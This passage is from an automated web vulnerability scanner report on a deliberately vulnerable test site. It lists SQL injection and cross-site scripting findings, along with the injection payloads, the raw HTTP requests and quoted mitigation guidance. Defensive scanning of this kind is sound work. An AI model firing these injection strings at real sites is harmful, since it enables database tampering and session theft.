       <Details><![CDATA[URL encoded GET input <b><font color="dark">cat</font></b> was set to <b><font color="dark">-1 OR 3*2*1=6 AND 00053=00053 -- </font></b><br/><br/>Tests performed: <ul><li>-1 OR 2+53-53-1=0+0+0+1 --  =&gt; <b>TRUE</b></li><li>-1 OR 3+53-53-1=0+0+0+1 --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2&lt;(0+5+53-53) --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2&gt;(0+5+53-53) --  =&gt; <b>FALSE</b></li><li>-1 OR 2+1-1-1=1 AND 00053=00053 --  =&gt; <b>TRUE</b></li><li>-1 OR 00053=00053 AND 3+1-1-1=1 --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2=5 AND 00053=00053 --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2=6 AND 00053=00053 --  =&gt; <b>TRUE</b></li><li>-1 OR 3*2*0=6 AND 00053=00053 --  =&gt; <b>FALSE</b></li><li>-1 OR 3*2*1=6 AND 00053=00053 --  =&gt; <b>TRUE</b></li></ul><br/> Original value: <b>4</b>]]></Details>
       <Affects><![CDATA[/listproducts.php]]></Affects>
       <Parameter><![CDATA[cat]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

<p>Be aware that &quot;sanitizing the input&quot; doesn't mean merely &quot;remove the quotes&quot;, because even &quot;regular&quot; characters can be troublesome. In an example where an integer ID value is being compared against the user input (say, a numeric PIN): </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM table
     WHERE id = 23 OR 1=1;  -- Boom! Always matches!
</pre></code>
<p>In practice, however, this approach is highly limited because there are so few fields for which it's possible to outright exclude many of the dangerous characters. For &quot;dates&quot; or &quot;email addresses&quot; or &quot;integers&quot; it may have merit, but for any kind of real application, one simply cannot avoid the other mitigations. </p>

<h2>Escape/Quotesafe the input</h2>
<p>Even if one might be able to sanitize a phone number or email address, one cannot take this approach with a &quot;name&quot; field lest one wishes to exclude the likes of Bill O'Reilly from one's application: a quote is simply a valid character for this field.</p>
<p>One includes an actual single quote in an SQL string by putting two of them together, so this suggests the obvious - but wrong! - technique of preprocessing every string to replicate the single quotes:</p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = 'Bill O''Reilly';  -- works OK
</pre></code>    
<p>However, this naive approach can be beaten because most databases support other string escape mechanisms. MySQL, for instance, also permits \' to escape a quote, so after input of \'; DROP TABLE users; -- is &quot;protected&quot; by doubling the quotes, we get: </p>
<code><pre wrap="virtual">
    SELECT fieldlist
      FROM customers
     WHERE name = '\''; DROP TABLE users; --';  -- Boom!
</pre></code>    
<p>The expression '\'' is a complete string (containing just one single quote), and the usual SQL shenanigans follow. It doesn't stop with backslashes either: there is Unicode, other encodings, and parsing oddities all hiding in the weeds to trip up the application designer.</p>
<p>Getting quotes right is notoriously difficult, which is why many database interface languages provide a function that does it for you. When the same internal code is used for &quot;string quoting&quot; and &quot;string parsing&quot;, it's much more likely that the process will be done properly and safely.</p>
<p>Some examples are the MySQL function <b>mysql_real_escape_string()</b> and perl DBD method <b>$dbh-&gt;quote($value)</b>. These methods must be used. </p>

<h2>Use bound parameters (the PREPARE statement)</h2>
<p>Though quotesafing is a good mechanism, we're still in the area of &quot;considering user input as SQL&quot;, and a much better approach exists: bound parameters, which are supported by essentially all database programming interfaces. In this technique, an SQL statement string is created with placeholders - a question mark for each parameter - and it's compiled (&quot;prepared&quot;, in SQL parlance) into an internal form. Later, this prepared query is &quot;executed&quot; with a list of parameters: </p>

<b>Example in perl</b>
<code><pre wrap="virtual">    $sth = $dbh-&gt;prepare(&quot;SELECT email, userid FROM members WHERE email = ?;&quot;);
    $sth-&gt;execute($email);
</pre></code> 
<p>Thanks to Stefan Wagner, this demonstrates bound parameters in Java: </p>

<b>Insecure version</b>
<code><pre wrap="virtual">    Statement s = connection.createStatement();
    ResultSet rs = s.executeQuery(&quot;SELECT email FROM member WHERE name = &quot;
                                 + formField); // *boom*
</pre></code> 

<p><b>Secure version</b></p>
<code><pre wrap="virtual">    PreparedStatement ps = connection.prepareStatement(
        &quot;SELECT email FROM member WHERE name = ?&quot;);
    ps.setString(1, formField);
    ResultSet rs = ps.executeQuery();
</pre></code> 

<p>Here, $email is the data obtained from the user's form, and it is passed as positional parameter #1 (the first question mark), and at no point do the contents of this variable have anything to do with SQL statement parsing. Quotes, semicolons, backslashes, SQL comment notation - none of this has any impact, because it's &quot;just data&quot;. There simply is nothing to subvert, so the application is be largely immune to SQL injection attacks.</p>
 
<p>There also may be some performance benefits if this prepared query is reused multiple times (it only has to be parsed once), but this is minor compared to the enormous security benefits. This is probably the single most important step one can take to secure a web application. </p>

<h2>Limit database permissions and segregate users</h2>
<p>In the case at hand, we observed just two interactions that are made not in the context of a logged-in user: &quot;log in&quot; and &quot;send me password&quot;. The web application ought to use a database connection with the most limited rights possible: query-only access to the members table, and no access to any other table.</p>
<p>The effect here is that even a &quot;successful&quot; SQL injection attack is going to have much more limited success. Here, we'd not have been able to do the UPDATE request that ultimately granted us access, so we'd have had to resort to other avenues.</p>
<p>Once the web application determined that a set of valid credentials had been passed via the login form, it would then switch that session to a database connection with more rights.</p>
<p>It should go almost without saying that sa rights should never be used for any web-based application.</p>

<h2>Use stored procedures for database access</h2>
<p>When the database server supports them, use stored procedures for performing access on the application's behalf, which can eliminate SQL entirely (assuming the stored procedures themselves are written properly). </p>
<p>By encapsulating the rules for a certain action - query, update, delete, etc. - into a single procedure, it can be tested and documented on a standalone basis and business rules enforced (for instance, the &quot;add new order&quot; procedure might reject that order if the customer were over his credit limit). </p>
<p>For simple queries this might be only a minor benefit, but as the operations become more complicated (or are used in more than one place), having a single definition for the operation means it's going to be more robust and easier to maintain. </p>
<p><i>Note: </i>it's always possible to write a stored procedure that itself constructs a query dynamically: this provides no protection against SQL Injection - it's only proper binding with prepare/execute or direct SQL statements with bound variables that provide this protection. </p>

<h2>Isolate the webserver</h2>
<p>Even having taken all these mitigation steps, it's nevertheless still possible to miss something and leave the server open to compromise. One ought to design the network infrastructure to assume that the bad guy will have full administrator access to the machine, and then attempt to limit how that can be leveraged to compromise other things. </p>
<p>For instance, putting the machine in a DMZ with extremely limited pinholes &quot;inside&quot; the network means that even getting complete control of the webserver doesn't automatically grant full access to everything else. This won't stop everything, of course, but it makes it a lot harder. </p>

<h2>Configure error reporting</h2>
<p>The default error reporting for some frameworks includes developer debugging information, and this cannot be shown to outside users. Imagine how much easier a time it makes for an attacker if the full query is shown, pointing to the syntax error involved. </p>
<p>This information is useful to developers, but it should be restricted - if possible - to just internal users. </p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input. <br/>Check detailed information for more information about fixing this vulnerability.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /listproducts.php?cat=-1%20OR%203*2*1=6%20AND%2000053=00053%20--%20 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:35 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 48618
]]></Response>
       </TechnicalDetails>
       <CWE id="89"><![CDATA[CWE-89]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:M/Au:N/C:P/I:P/A:P]]></Descriptor>
          <Score><![CDATA[6.8]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Medium]]></AC>
          <ACdesc><![CDATA[The access conditions are somewhat specialized.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[Partial]]></A>
          <Adesc><![CDATA[There is reduced performance or interruptions in resource availability.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N]]></Descriptor>
          <Score><![CDATA[10]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Changed]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can affect resources beyond the authorization privileges intended by the vulnerable component. In this case the vulnerable component and the impacted component are different.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[High]]></I>
          <Idesc><![CDATA[There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix SQL Injection Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: SQL Injection tutorial]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-sql-injection-tutorial/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Injection Flaws]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Injection_Flaws]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How to check for SQL injection vulnerabilities]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/sql-injection2/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[SQL Injection Walkthrough]]></Database>
          <URL><![CDATA[http://www.securiteam.com/securityreviews/5DP0N1P76E.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="69" color="red">
       <Name><![CDATA[Cross site scripting (verified)]]></Name>
       <ModuleName><![CDATA[Scripting (XSS.script)]]></ModuleName>
       <Details><![CDATA[URL encoded POST input <b><font color="dark">searchFor</font></b> was set to <b><font color="dark">the'&quot;()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;gJfZ(9263)&lt;/ScRiPt&gt;</font></b>]]></Details>
       <Affects><![CDATA[/search.php]]></Affects>
       <Parameter><![CDATA[searchFor]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[Malicious users may inject JavaScript, VBScript, ActiveX, HTML or Flash into a vulnerable application to fool a user in order to gather data from them.
An attacker can steal the session cookie and take over the account, impersonating the user.
It is also possible to modify the content of the page presented to the user.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to Cross Site Scripting (XSS) attacks.<br/><br/>
Cross site scripting (also referred to as XSS) is a vulnerability that allows an attacker to send malicious code (usually in the form of Javascript) to another user.
Because a browser cannot know if the script should be trusted or not, it will execute the script in the user context allowing the attacker to access any cookies or session tokens retained by the browser.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from The Cross Site Scripting FAQ - http://www.cgisecurity.com/articles/xss-faq.shtml </i> 

<h2>Introduction</h2>

<p>Websites today are more complex than ever, containing a lot of dynamic content making the experience for the user more enjoyable. Dynamic content is achieved through the use of web applications which can deliver different output to a user depending on their settings and needs. Dynamic websites suffer from a threat that static websites don't, called &quot;Cross Site Scripting&quot; (or XSS dubbed by other security professionals). Currently small informational tidbits about Cross Site Scripting holes exist but none really explain them to an average person or administrator. This FAQ was written to provide a better understanding of this emerging threat, and to give guidance on detection and prevention.</p>

<h2>&quot;What is Cross Site Scripting?&quot;</h2>

<p>Cross site scripting (also known as XSS) occurs when a web application gathers malicious data from a user. The data is usually gathered in the form of a hyperlink which contains malicious content within it. The user will most likely click on this link from another website, instant message, or simply just reading a web board or email message. Usually the attacker will encode the malicious portion of the link to the site in HEX (or other encoding methods) so the request is less suspicious looking to the user when clicked on. After the data is collected by the web application, it creates an output page for the user containing the malicious data that was originally sent to it, but in a manner to make it appear as valid content from the website. Many popular guestbook and forum programs allow users to submit posts with html and javascript embedded in them. If for example I was logged in as &quot;john&quot; and read a message by &quot;joe&quot; that contained malicious javascript in it, then it may be possible for &quot;joe&quot; to hijack my session just by reading his bulletin board post. Further details on how attacks like this are accomplished via &quot;cookie theft&quot; are explained in detail below.</p>

<h2>&quot;What does XSS and CSS mean?&quot;</h2>

<p>Often people refer to Cross Site Scripting as CSS. There has been a lot of confusion with Cascading Style Sheets (CSS) and cross site scripting. Some security people refer to Cross Site Scripting as XSS. If you hear someone say &quot;I found a XSS hole&quot;, they are talking about Cross Site Scripting for certain.</p>


<h2>&quot;What are the threats of Cross Site Scripting?&quot;</h2>

<p>Often attackers will inject JavaScript, VBScript, ActiveX, HTML, or Flash into a vulnerable application to fool a user (Read below for further details) in order to gather data from them. Everything from account hijacking, changing of user settings, cookie theft/poisoning, or false advertising is possible. New malicious uses are being found every day for XSS attacks. The post below by Brett Moore brings up a good point with regard to &quot;Denial Of Service&quot;, and potential &quot;auto-attacking&quot; of hosts if a user simply reads a post on a message board.</p>

<h2>&quot;What can I do to protect myself as a vendor?&quot;</h2>

<p>This is a simple answer. Never trust user input and always filter metacharacters. This will eliminate the majority of XSS attacks. Converting &lt; and &gt; to &amp;lt; and &amp;gt; is also suggested when it comes to script output. Remember XSS holes can be damaging and costly to your business if abused. Often attackers will disclose these holes to the public, which can erode customer and public confidence in the security and privacy of your organization's site. Filtering &lt; and &gt; alone will not solve all cross site scripting attacks and it is suggested you also attempt to filter out ( and ) by translating them to &amp;#40; and &amp;#41;, and also # and &amp; by translating them to &amp;#35 (#) and &amp;#38 (&amp;).</p>

<h2>&quot;What can I do to protect myself as a user?&quot;</h2>

<p>The easiest way to protect yourself as a user is to only follow links from the main website you wish to view. If you visit one website and it links to CNN for example, instead of clicking on it visit CNN's main site and use its search engine to find the content. This will probably eliminate ninety percent of the problem. Sometimes XSS can be executed automatically when you open an email, email attachment, read a guestbook, or bulletin board post. If you plan on opening an email, or reading a post on a public board from a person you don't know BE CAREFUL. One of the best ways to protect yourself is to turn off Javascript in your browser settings. In IE turn your security settings to high. This can prevent cookie theft, and in general is a safer thing to do.</p>

<h2>&quot;How common are XSS holes?&quot;</h2>

<p>Cross site scripting holes are gaining popularity among hackers as easy holes to find in large websites. Websites from FBI.gov, CNN.com, Time.com, Ebay, Yahoo, Apple computer, Microsoft, Zdnet, Wired, and Newsbytes have all had one form or another of XSS bugs.</p>

<p>Every month roughly 10-25 XSS holes are found in commercial products and advisories are published explaining the threat.</p>


<h2>&quot;Does encryption protect me?&quot;</h2>

<p>Websites that use SSL (https) are in no way more protected than websites that are not encrypted. The web applications work the same way as before, except the attack is taking place in an encrypted connection. People often think that because they see the lock on their browser it means everything is secure. This just isn't the case.</p>


<h2>&quot;Can XSS holes allow command execution?&quot;</h2>

<p>XSS holes can allow Javascript insertion, which may allow for limited execution. If an attacker were to exploit a browser flaw (browser hole) it could then be possible to execute commands on the client's side. If command execution were possible it would only be possible on the client side. In simple terms XSS holes can be used to help exploit other holes that may exist in your browser.</p>


<h2>&quot;What if I don't feel like fixing a CSS/XSS Hole?&quot;</h2>

<p>By not fixing an XSS hole this could allow possible user account compromise in portions of your site as they get added or updated. Cross Site Scripting has been found in various large sites recently and have been widely publicized. Left unrepaired, someone may discover it and publish a warning about your company. This may damage your company's reputation, depicting it as being lax on security matters. This of course also sends the message to your clients that you aren't dealing with every problem that arises, which turns into a trust issue. If your client doesn't trust you why would they wish to do business with you?</p>]]></DetailedInformation>
       <Recommendation><![CDATA[Your script should filter metacharacters from user input.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[POST /search.php?test=query HTTP/1.1
Content-Length: 70
Content-Type: application/x-www-form-urlencoded
Referer: http://testphp.vulnweb.com:80/
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*

goButton=go&amp;searchFor=the'&quot;()%26%25&lt;acx&gt;&lt;ScRiPt%20&gt;gJfZ(9263)&lt;/ScRiPt&gt;]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:53:40 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 4017
]]></Response>
       </TechnicalDetails>
       <CWE id="79"><![CDATA[CWE-79]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:P/A:N]]></Descriptor>
          <Score><![CDATA[6.4]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[Partial]]></I>
          <Idesc><![CDATA[Modification of some system files or information is possible, but the attacker does not have control over what can be modified, or the scope of what the attacker can affect is limited.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N]]></Descriptor>
          <Score><![CDATA[5.3]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[None]]></C>
          <Cdesc><![CDATA[There is no loss of confidentiality within the impacted component.]]></Cdesc>
          <I><![CDATA[Low]]></I>
          <Idesc><![CDATA[Modification of data is possible, but the attacker does not have control over the consequence of a modification, or the amount of modification is constrained. The data modification does not have a direct, serious impact on the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Acunetix Cross Site Scripting Attack]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/cross-site-scripting.htm]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[VIDEO: How Cross-Site Scripting (XSS) Works]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/video-how-cross-site-scripting-xss-works/]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[The Cross Site Scripting Faq]]></Database>
          <URL><![CDATA[http://www.cgisecurity.com/xss-faq.html]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP Cross Site Scripting]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/Cross_Site_Scripting]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[XSS Filter Evasion Cheat Sheet]]></Database>
          <URL><![CDATA[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[Cross site scripting]]></Database>
          <URL><![CDATA[http://en.wikipedia.org/wiki/Cross-site_scripting ]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[OWASP PHP Top 5]]></Database>
          <URL><![CDATA[http://www.owasp.org/index.php/PHP_Top_5]]></URL>
        </Reference>
        <Reference>
          <Database><![CDATA[How To: Prevent Cross-Site Scripting in ASP.NET]]></Database>
          <URL><![CDATA[http://msdn.microsoft.com/en-us/library/ms998274.aspx]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="70" color="red">
       <Name><![CDATA[SQL injection]]></Name>
       <ModuleName><![CDATA[Scripting (Sql_Injection.script)]]></ModuleName>
       <Details><![CDATA[URL encoded GET input <b><font color="dark">test</font></b> was set to <b><font color="dark">1'&quot;</font></b><br/>Error message found: <pre wrap="virtual"><font color="blue">Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/search.php on line 61</font></pre>]]></Details>
       <Affects><![CDATA[/search.php]]></Affects>
       <Parameter><![CDATA[test]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[high]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information. <br/><br/>Depending on the back-end database in use, SQL injection vulnerabilities lead to varying levels of data/system access for the attacker. It may be possible to not only manipulate existing queries, but to UNION in arbitrary data, use sub selects, or append additional queries. In some cases, it may be possible to read in or write out to files, or to execute shell commands on the underlying operating system.<br/><br/>Certain SQL Servers such as Microsoft SQL Server contain stored and extended procedures (database server functions). If an attacker can obtain access to these procedures it may be possible to compromise the entire machine.]]></Impact>
       <Description><![CDATA[This script is possibly vulnerable to SQL Injection attacks.<br/><br/>
SQL injection is a vulnerability that allows an attacker to alter back-end SQL statements by manipulating the user input. An SQL injection occurs when web applications accept user input that is directly placed into a SQL statement and doesn't properly filter out dangerous characters. <br/> <br/> This is one of the most common application layer attacks currently being used on the Internet.  Despite the fact that it is relatively easy to protect against, there is a large number of web applications vulnerable.]]></Description>
       <DetailedInformation><![CDATA[<i>Quote from  SQL Injection Attacks by Example - http://www.unixwiz.net/techtips/sql-injection.html</i>
<h2>SQL injection mitigations</h2>

<p>We believe that web application developers often simply do not think about &quot;surprise inputs&quot;, but security people do (including the bad guys), so there are three broad approaches that can be applied here.</p>

<h2>Sanitize the input</h2>
<p>It's absolutely vital to sanitize user inputs to insure that they do not contain dangerous codes, whether to the SQL server or to HTML itself. One's first idea is to strip out &quot;bad stuff&quot;, such as quotes or semicolons or escapes, but this is a misguided attempt. Though it's easy to point out some dangerous characters, it's harder to point to all of them.</p>
<p>The language of the web is full of special characters and strange markup (including alternate ways of representing the same characters), and efforts to authoritatively identify all &quot;bad stuff&quot; are unlikely to be successful.</p>
<p>Instead, rather than &quot;remove known bad data&quot;, it's better to &quot;remove everything but known good data&quot;: this distinction is crucial. Since - in our example - an email address can contain only these characters: </p>
<code><pre wrap="virtual">
    abcdefghijklmnopqrstuvwxyz
    ABCDEFGHIJKLMNOPQRSTUVWXYZ
    0123456789
    @.-_+
</pre></code>

<p>There is really no benefit in allowing characters that could not be valid, and rejecting them early - presumably with an error message - not only helps forestall SQL Injection, but also catches mere typos early rather than stores them into the database. </p>

